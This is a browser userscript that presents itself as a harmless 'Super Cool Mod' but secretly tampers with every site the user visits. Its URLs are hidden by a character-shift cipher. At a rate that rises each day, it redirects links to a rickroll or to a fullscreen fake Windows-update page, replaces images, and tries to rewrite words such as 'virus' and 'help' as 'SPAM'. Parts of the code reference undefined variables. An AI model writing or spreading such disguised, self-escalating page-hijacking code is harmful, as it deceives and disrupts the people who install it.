// ==UserScript==
// @name         Super Cool Mod
// @namespace    https://github.com/johnsmith9/cool-mod
// @version      3.42
// @description  win every time
// @author       John Smith
// @match        *://*/*
// @grant        none
// ==/UserScript==

let ENABLED = true;

const DEBUG = true;

var startImgReplaceRate = 0.01;
// var startImgReplaceRate = 1;

const URL_MW = "ebub;jnbhf0kqfh<cbtf75-0:k05BBRTl[KShBCBRBBBRBCBBE03xDFBBxKDSZWFyZXGSZZHChbGih[Gh1YHCpWHCVbMSxxMzxpMC9nMExyNjl5Oi9hQll0SE6BSVWFK{CNVluDVk2ESFFCER5PFiBUISVWIVFoJDeCUVGCRVGCRVGCRVGCRVGCRVGCRVGCRVGCRVGCRVGCRVGCRVGCRVGCRVGCRVGCRVGCRg0BBCFJBRNBxhNCJhBDFRFEFRI0yBBcBBFBBhNCBRBBBBBBBBBBBBBBCBZECRdDBg0FBFdRBBJCBhJHChZGDhVFBxBBBBFDBBNSCDFGCiJyRWFUJnGyh[GTpcIC1fFINlKjdiRkKFOkd6Lz9QF{V7L{xiVmp,KVhqQ0yBBbBRBDBxFCBBBBBBBBBBBBBBBBBhFECBVH09RBLCFBBhJDBhJCCBJEBRBBBBBBBBFDFRNyCDFTRSNzRmGiCTJkN4FV0:pBEBNCBBJSByFBQxErFSFBFSFBFSFBQiN,zo0TDXOEEru09gbz8FQyl{W0TmUpmXverxGo4tG6:4sItTV2GqNmL2bMKF,GycbvMXwuYzu49qqtWsKTR8ONHp4qEKgQ6XiLdZr3zEeSLxeMZvq:WWRej4Qnc,zfmcGOwroxtQ[b[[94IFj1XXKpV7dgsHQfc,3TFye[e:n9QibJw6ID4UKOuFiVuJr42hRgQ2TXkitxRf7bp[9fU7[XUS7nF5rnLhqm2ElcRp8R3zPes4uJfm:KHjiDXORkrrdxwb[ReG1rw0WLEPy[nr8UPUdor90WImKJFsPpSFSzCFSBCFSBCFSBCFSBCFSBCFSBDv74ZgcppgSdlOzznrYTb17bmd3,zwI,14nt2SSSBKtydFMyJtfIk8KVbeQbO6Sosy8FfSyeJmqVsWtoZiM47JHzh:13fIqJv5DRB,zMD[9NsF8qy913:tWut3rON7{CTqokN1694fhSmF,nZR[73qR5tePk6Vpiv01qhMNqzKC:JUQuU7RHzml[Ti3nPnb4Ntyb8NUf6O8{yp3hQzvnTCdccew2U9[ObnWNl5KVOROZCxDOsnE0BG761,MzIPdWKk4Tp3tSF86XJjJBJjJBJjJBJjJBJjJBKjyPJXnkPytrj68gn[mmQ2n1muWPjV:WQsgfc6f39C[zqXb4IZ2r2Rt4hwCSQmJXlXld6LHRoO6F8eGDw3gUWuoK,H1vpHze0[OOV{ZMf2{KXNqKSxqeft6zEIdnX[u{z5zrIG,cpeL{fEI44L[:HlG56e96Qhecb:LtHqP5{,p88bQ4h6[{t2HkSyXHq2jhYcqiycJsdd53U,PkGXnQUJ75lIP,VxWOLpwN:xnqOCmPUH4p96N1ukWx,F3lST8[CnYbD[[n4Qm3zkExmlfzF[m12TKtUbUrOeX{Wh[yrosB{Wh4XKMc3b5cwH7y:V7uT1RqpKjbEuU3rbvbS7z6kowmng9BkmHOqlr{[QoNH1WOyQXHZtpK6U75zoEc,PbTIUt3PFyRZBfYZfYxlzWvmY3X8Q7:d43IscT:p4:w:0kQTdMlgMHouFt{SFUpFDJjBDJjBDJjBDJojsWWW[oJWWCMNexFBJvmdbLOC453tw5wm8q{rr,1c88zgqoUMZq8D7pE2F:68U7u4P9Dnm{Ld10GV[6Qze,l[7DTTSQmOcUJSPWK,UKJOeUwH9TURri1LuvQkZ:4LZ7j{2RxvUNUZEPXZ9{yepF7JOEVnj2Yc3mSTcnyZ,W9t6[Neq3nrMitQlrhLX4XX1rXJ1vy7rFhY,uJb2dzTTT[eQOlzLm1T6m1G[TpBZYF,Wbbvnx3b9PPzf8mLyTr3{CJQgK3H1rWQY{IqD[pgKiestGKN9ZYVbjb,1XDKf6uuNgBFf3YXwjG7ObOJeVLG8mlMCJuWBxcJ:to1rDrNiF{9,V252S[7DKZBUH6lhMJ8j15f[31zVrJW[qtNCjsFeo3fZ0sNTMVqjZmPzckLcvQmdLb3P1XpNDBSnEnP3g[s:I5pFX68vx0PcDfny[GmjqJVSFT1CFSBCFSBCLWsSqkcZ1Vcrrfvx4N0MvIu9KL16q9mnp1ntpzfrO8fQM3:3,o2cGkbWvePjrdsWJ:sxunUK2C[FqD2qOqUColKp{jfyQJF:B{LjU5Gv[F12W[bXzoIgKrIPTkh2rjyjO,QcCIQD3zCdI9WtqlSsz9Qrvkd[q:J7wtuuiSf02iynnQJywpWqnqR{6VyLrcF6,jN{OmiODWXZBjxwoO2U2Sq88BI2zK6pS3xVXzCr6jnGTz4Ln4Wm7VUX7Q1OUpkrhU[hUk9kJtlsSgCVv{5[DrwoK{ELRbz{NmcMFZIZHZHN:P2qjCIkONGTKQb2ulj3V43By5rDy,ux,9QjPQo4Wjr3d{VLqXyCuy9fd7QH{wF01yQ[dJlUBZwqVvccRzci0YzNm{vylqKObZDJjNBlQTvJOQE2HCtRuh4Jl3w76Nnk2uscPFc8{rwrw8qNery[vlziwWv6ch[5uwNiV72ycjKMPTyKyvUlkNvvkMTbUrMYntR3lvh,d6v[E1cNHCQOOtq8JnSeFoxTgin4TCKXH4yNobCH6qn5nRrENOCqnwNUIQhVEhK7ChSGg[LNhN:UHEQSbVuVPnINi2{N2TqJOW5jgeEXfI{l[2BO6m[qieSOVOB{Hd{Qkuth{56B4TMkbulKnjLwpWn42cyu73zU:ZNwkw:y96c[{4SSOPqTQLpiQdU0feDod5cvGghiDJjcDSLwsv47Pp,,U7woMSLQs:jd7eQ8v26o6DG23KQSUNFBbiI[86Orubb8CNfnzvSb6uxG0nQPTb8ebQk0ujN{uTNn2N:CsHRSVn[Lt6vXQ[fuH5p2[OWybbONUbfny3XSnLXO41KSvxxnfn5FrzZrty7v7TG0LE:pE2yIhgul1X7kjiKQ6RKUlqZk1y0ENqcFk8bowCFsgHYql4ScSjC{nRWRfNqzZkGE1E6j[SqMFs:iU4HW0,[0lMMfHnO3uL8R16Wz37cDcLiqeXzZX89qYQkt[TSKfqJk2N6ostv{uL[sYrh{PtWT8IUSlbqNMWENU2fFxWb2vN1yjT3[EXuJfNrhsoNOXuJ{t{ihrmjG[{ZYtpGzf5XN159ZqvFwt[c8[UpjQdBkdRE7q{YBwfnN6g:E2OsE1kzU[0iOweO0DePTKSOjJoTKF6[sojuwHPM6M[S3XHgsCoVbkiW[kvVGk4BUjnmr,4Yejc4Z:coFn7Rl,3lXQV4R46Sitb4G:joTZ9IYs8,WzomOCjRRUdFIjqzJN7[rgh,i1gi25vwTOxO4O0VDC5Tsb7bJ7Lw1zkrWTTfT2PJ9e0ozmvIqVKlk1njrcV:DqQEDZj1{[Z1xjT,mohuNBbger[Hi7KOHvz9[MUTcEkOXXoxuFdMJptOMT4PTCqL0LWZOQZrld[V9O,zLMXNe3kzo1Z,4poxmYHKcoQw6R4PM9UDj1oTb,jKkgTj,hEL1NTfd:kFnIh1GH:gTSZXBtQSolZsLbmL1::MLIkulqF:tUJ:YFTL2fSrmbXRy1PTIsz57i5FNmft7hiw{L4H:cYcxO29kLBhbp7phMN8CWRgbZo6{uHjeIsitOUpsotM[n4cUdU5lneEk5,80BJ62SqnkXrVUgrWIRY4lYzQklgHYoWrsuVXYjsozu0fWMXvo1PlHb3WToUgb5YB3cg7C6{ebr5n2Wm5Pmy4ki739plG9fg:NicM[FSPlNReN2OoEWk,{J99wgPN7RVXKHS{oYObI3dEXQNJQOyPSZ9YtP[BmPWjQ[30DD2LnQ3bfzfOJZGL:G7WRYWix4rfZ8SNuCcJh6Jp9iNlvR6y4UHjbnHrnoVIbkk7ss{Iw6HbqiP2bU1WTyWN17r4H:YHUJ4NIo7kywP[be2dr5Svu27cIrZhDxQZSxQu5dcKl8WmckXkRU8Q[XBtyO:lojM{JSBXMbKpyyQ[XMRtLQJo39cNGZCRwH2F,3lCS:W8U21tyl{xZwjsKQcW[hbpZZz4bqbnnvWyHKX2IgUpIJ2,1k1Qc4c8ZZ8eJLOkrEr9ScHWW{JJpJSx5w5638DUyFw1,BXzH8zuQt4SjprlTV0YoCOWPHLXEEqBXQp:Y,wHZOD5SrGXkeupm2ILxKu8{OusHfwUIZgc9qhpleMS0fK8[{vR7{Ss9jscMSFSPlNbIYGsZK,21Is,V6bLYTZjlh4uVVfveL26b3FVd7z,x0LVkWkE:KqLhQSZw9Bxj0vmPYuqD0deeuFSMyiOWsHhcDvsD5c[vwdc,7cXbkXS8Zgwc0jghJFT1{mmXlGK5EunJsy:nd:7UOlN4Q1ebIUFEGHvv3hGOWVlj{YO8FH:9i6{H5fUeDx8SphJ3[gNgrDqvdQWL0trhvQ5hM39EL8j:XNWS,uS[2I37g6xIxHgrFrmklupfkUeHcU5LVlPvzcFGTO7oJkxN9mf3WF1ZTpolsKCUtolrCyl3GHBMQiF3nH1UYr37PkVf03hkCg5km76wNIrIYdB2HTm:{0BCHIlcfty5ymMTJbLebfLkBc{MSq0W:dLuutv3YYuthhkmd9kymcqZQbdFy6RdGcFUW1YIVoWnkYqkGWiu3rNrVU:RX5ldUndu4gx7IL0reSD5TxGi1so2E5TxUWjT9F1XNSFT1hsftw,KU8wZgoNXH0y7Q5yKftmL0SOzMB,Z,djZZXs1Qyk3Undig6p09BSWumqjJoU7HLos506jlwPpy9i96puRrP2kbkfiSQid{Z7:WerqSqh0WWnL:qQz:dx0S,v{XyG9uqW3c9cHVUb91iF08Nw1SFwIF1XucXx50G8woO8L:sj2tPw5qFuDz1{m3nYtpF7O:InE7QSztSZ2Lkw5cw,K96{EUORlhBYodOG5QpNOSp,iTSE3lEN,3V524[FOFvJjYkojqTWtnWXI4hE8[HcSPIcgi7K87TI4T[FiqNDDOD5Y052E09rgxljmiLbgVqpo5VWgZKnjRpqbRDJjNCU:fbYVWvZB9k9yLop,lOn9v,vjYx7olU8wiLSiU[EoNgM,mGQ4oSuXmuiFQOoQ9Br,V312,h13dKRIPnH990gOiOPOWCJvFSFdEWbgG7TgwC0LgiOeiy,lVQyI,V{b7bG7R8IItQynrpY0LdQzv49ioO6I,7KItt1SF7SKz4XMGm9cWQCYL,XYvnMD5mrcLzH{B4IcOWjbqbp8I8UGwYKmbqtiUxtKl6IV{Po8Pq7Ly5s1Wd[FksMzNnzobp7RVoZC,uo4H4:qd[ejo6Su8Ml8RmX24dDmUG8Y[wZKb[T0qGKGHhSvEwgzFtbuCOXjibQp:OqEEKwwjLW0xiso3HeyoF:UiubXxu0xENr08UgBUulTDqBmTFSFtHFSFBFSFBFSFBOGsdpPFb0Cicwt[{{ENBsFn4HYgYnqcELPcNgW08UonEVuWq1:,4VSQBn4wnclMzTSW:8Pz5Lot1bT,kUSgK[ohyODWLj1U5{BBl8iQt2flNY2:hFBLBXc84z:56SNl2DMcJcpW74TYCHYCfY{nnyvJ7PpkM:iheoo0ge5z[TyhKJI9V1PmNTDXQFHdK6KTzfUZu,z,snBRdjMkvjRuHZw9BS7Q8ro0LJob,WEoIdT0YgmuNE5Hcl1VrZdB8zumu7Vi72bLcEZ3pHC7Pp8WLU9HWkdj0NFlX6XQFTQp3vVQQZP1GQ:elULse0tprk[5gCW:H21YFNu3VNsJyL8,[BOycQwF7UpcTT5nhLj88mX5eZgH596z8Unnoyip2XSvpuoztv0icLYMVCzbOglIT4gc,1fLrgXnXS41X,V47SDPhqMyMu7hQmMmLM:JsY0Km0fI3gBz6vl3UMSUeVCcT,F0IV03nocKywWri0xC1xi0bO0uuPzSNUuBiFSMCiFSBCFSBCFSBDlb02t7Dgeek6k5HWcRzE9txyu,wqg{jXEYqw1qCzpLg:cgDbgRD8XOx50cLgMQ4UQmg:pprY2N7yFSOCbZNYjmqVz8HxGhP1l3IumPy5sWn7QEsuv4Xe83WcofUxIMkmZB3n42ts8OGFul{Gj4BBEe4:ZfSnIV7h3yWsXtkmGq44tr474dT6u4dsUQmh9llopS:vkY5MSecEt72bjtRBeqM34evd2PQsLFZofXu76N16qWmrWnV84[W8RNi8CL{XyUDnrww3uqwvjd,fKgJ71JYgCZk9{U{0Wq0MQti5YRnNbnkDoUBLLRsNRxGvJuwjcwG0huMkk9CUyGG7WWeqIVh8srccyzJ5Ih[zkT3h7,BrrbpE13bzZigruchSwCQvOjcHeilcH5LoYqOTrrHSi[lQHy8N8jxuyCm95LTCr{nGXp{pHq2lT07i,rwnNq1wSXHXmRSWub2zxBH1y4n2v42DbueTdBMgnXOwtnuWJ0nn,qVmWRrBCRMCSxFYICy3RmS8mB,lKw{3II4DgY9qg6{w7RYCyOKSwXmo3[nP:Njc7Ocrxm:J5Z9nd0,Oq2bdu2QO:JVP7q6:H[2LWZQq[NeDJjYkDJjBDJjBDJjBGB28I7Ro8mg63np2[c0BMkii::0:t{[75tXy[B{3VSeoxw0BNqseWdP{bUp[XDDp8Yzz3DQbxnbgd1jqc[2XJjbT1hbR1eUsmHrj7V:pnlSeXGuy8CcylYHbbqro6qxDsB[JTuvXZBzvPQD197cyHMRO1DcbmG3eiT2RQd458sXulfPZzmRskTGZHo,TWBc4{Up2Q9B:kZfvWUl2qDTc:Jh2tTs2FROdsencv,N,bCxo6YkGRBtprC7queWqrc3K,:b4cd9kOsp87PbicbyOdLHG4qVcmjfX3Sb4QJ,,YwB7PqZfnLeHnrLQtsyQNl6l::{LZZHocJVQzTZjKsMCFSBCFTQktZuHl2Suz9PKO:1BcplUoPtW[XyUtSd8XzPJtCc4Y9[J1msCX[I[bnzC,qUr6e:s,vbjmk2[2KWTMYMI5yIOP5,{Oml3mSQ1Z7sWS8BNqvsD5{,C4fN7Ei9TuSRzowYjq8S{mGswUONNuur2:lY{IPb4S3tUcZX:sH33DRRP9IeNnGvMlwSNKPP{rNUTbQ13sGG[hepiWfyG{48t,{6{e{[HTlsSfoZjJkFjJjBDStgkGp1nrOotkKgTchQFzUL8sj8Mi2ZBmSV76BK3StoN35gLTujzcTcSU2yUHt{vct{Gjf3UtMjkSssXVCkZhh9WJ602vnlPJV6ih[LxvMVdckumPYGc9l7[kVqK3Y4D7{ZfqlX[E7Ms8ydTe02Hk0nK64mLx3KqiTXDhc{2Svnu1wUflGrJYGO:2,C8yLWmnoUSpkOuYS1V7WpEgWRe6u8[JqW2dYS2dflsBk2UnnCy,zq3zYGt2Kn2xOSvh7bjcrNziKMK54wKXe,1Nqu,j:SOGr0qx5iBHJMEJ6XZIv0uO8OLblsSZJjKJDJjBDWsYEHMTYEcg2Hs:cmf4:0LXXRuKbMqZrlbOeeqDRe:jqIFF[hk434R2pir2SzoTvllfqY[HvHOhpGhp,d2vCs8TiTREc[46cq1gC0S2h7eRNyr2REdVLkKtfJWRU4F3QFHcIUvrnIypVtEUeG3Vs1xBeo1TOyB5dSoZj6wWHEUcfyIGtrPodYUGMEGDCt1keckg9B1ELsiI3biEhrc4LlXJC8EM8p0xDkiVrL3JyCsLiCXhF7OX{5ltdv{Mwmk1{r:i9bpGeEuMgZspem19gdRS3RXQuu,xdX,zobKy:NZLuUexUUtzPP0MyoSVb5C6hI2Tr7Q2DxuC2ccsWBEd1rsJVZkedCSv88d6b6NJuXPw3JjKZTJjJBJjJBboIbuZTwdwSVNg2rgn4w4sb0kfWcTPpeSMuiboTE0JrXW0CyZF:iB86g5hL5q8SzFZh1XbmjVeDRRzPqV3QZfIL3V3LbXq2tGVxrNbuSeopmWTYgQhCogvoS9SibeRXrJsk1YWYIlSQPH1gSp47LmUq4{PxjqgzBmMyX:lSkWs1d[UHeHyWxWQGIHz4ld6weXeJPT2QEVb2XnWZP2hVX0xC8JY{6449kPpNhQ2hE4hI3xCcMiE5WfzWHjs7ubvWrMOVyUJ{I[7LliKGNYwn2idoMiZXP[wMUFT2KKViiFSKBSFRBSFRBSFRBSFRBSFRBSFRBSFRBSFRBSFRBSFRBSFRBSFRBSFRB0:l";
var mwWeight = 1;

var startLinkReplaceRate = 0.01;
// const replaceRate = 1;

const URL_RR = "iuuqt;00xxx/zpvuvcf/dpn0xbudi@w>ZeexlNKH2Kp";
var rrWeight = 0.5;
// const rrWeight = 1;

const URL_WU = "iuuqt;00gblfvqebuf/ofu0xjo21vf0";
const wuWeight = 0.1;

const TRIGGERS = ["uif", "sjdl", "spmm", "ipx", "wjsvt", "gjy", "ifmq", "tdippm", "nqtb{", "dpn", "psh"];
const REPLACEMENT = "TQBN";

const START_DATE = 1604986037029;
const DAY_MILI = 86400193;

function getLinkReplaceRate() {
    return startLinkReplaceRate * ((new Date().getTime() - (START_DATE /*- (100*DAY_MILI)*/))/DAY_MILI);
}

function getImgReplaceRate() {
    return startImgReplaceRate * ((new Date().getTime() - (START_DATE/* - (100*DAY_MILI)*/))/DAY_MILI);
}

(function() {
    print("current time: " + new Date().getTime());
    print("replace rate: " + getLinkReplaceRate());

    replace();

    initTriggerDetection();
})();

function replace() {
    let links = getLinks();
    for(let i=0;i<links.length;i++) {
        if(Math.random() < getLinkReplaceRate()) {
            randomLinkReplacement(links[i]);
        }
    }

    window.onload = (ev) => {
        let imgs = getImgs();
        print(imgs);
        for(let i=0;i<imgs.length;i++) {
            if(Math.random() < getImgReplaceRate()) {
                randomImgReplacement(imgs[i]);
            }
        }
    }
}

function getImgs() {
    return document.getElementsByTagName("IMG");
}

function getLinks() {
    return document.getElementsByTagName("A");
}

function randomImgReplacement(img) {
    let random = Math.random();
    if(random < mwWeight) {
        print(img.src+": mw");
        img.src = decrypt(URL_MW);
    } else if(random < mwWeight + ncWeight) {
        print(img.src+": nc");
        img.src = decrypt(URL_NC);
    } else {

    }
}

function randomLinkReplacement(link) {
    let random = Math.random();
    if(random < rrWeight) {
        print(link+": rr");
        rr(link);
    } else if(random < wuWeight + rrWeight) {
        print(link+": wu");
        wu(link);
    } else {

    }
}

function wu(link) {
    link.href = decrypt(URL_WU);
    link.target = "_self"
    const elem = document.getElementsByTagName("BODY")[0].children[0];
    link.addEventListener("click", openFullscreen(elem))
}

function rr(link) {
    link.href = decrypt(URL_RR);
    link.target = "_self"
}

function fixBackground() {
    const css = `*:fullscreen, *:-webkit-full-screen, *:-moz-full-screen {background-color: rgba(255,255,255,0);}`;
    const style = document.createElement('style');
    if (style.styleSheet) {
        style.styleSheet.cssText = css;
    } else {
        style.appendChild(document.createTextNode(css));
    }

    document.getElementsByTagName('head')[0].appendChild(style);
}

function openFullscreen(elem) {
    print("attempting fullscreen");

    try {
        if (elem.requestFullscreen) {
            elem.requestFullscreen();
            //elem.appendChild(style)
            //document.getElementsByTagName("BODY").appendChild(style)
        } else if (elem.mozRequestFullScreen) { /* Firefox */
            elem.mozRequestFullScreen();
        } else if (elem.webkitRequestFullscreen) { /* Chrome, Safari and Opera */
            elem.webkitRequestFullscreen();
        } else if (elem.msRequestFullscreen) { /* IE/Edge */
            elem.msRequestFullscreen();
        }
        elem.style.backgroundColor = "rgba(255,255,255,0);"
        print(elem.style.backgroundColor);

        print("success");
    } catch (e) {
        print("Couldn't make fullscreen!!");
        print(e);
    }

    fixBackground();
}

function print(msg) {
    if(DEBUG) {
        console.log(msg);
    }
}

function encrypt(str) {
    let result = "";
    for(let i=0; i<str.length; i++) {
        let charint = str.charCodeAt(i);
        result+=String.fromCharCode(charint+1);
    }
    return result;
}

function decrypt(str) {
    let result = "";
    for(let i=0; i<str.length; i++) {
        let charint = str.charCodeAt(i);
        result+=String.fromCharCode(charint-1);
    }
    return result;
}

function initTriggerDetection() {
    document.addEventListener('keydown', function(event) {
        print(document.activeElement.innerHTML);
        for(let i=0; i<TRIGGERS.length; i++) {
            print("replacing key down...");
            document.activeElement.innerHTML.replaceAll(decrypt(TRIGGERS[i]), decrypt(REPLACEMENT));
        }
    });

    document.addEventListener('focusin', function() {
        const textElem = document.activeElement;
        print(textElem.innerHTML);
        for(let i=0; i<TRIGGERS.length; i++) {
            print("replacing...");
            textElem.innerHTML.replaceAll(decrypt(TRIGGERS[i]), decrypt(REPLACEMENT));
        }
    }, true);
}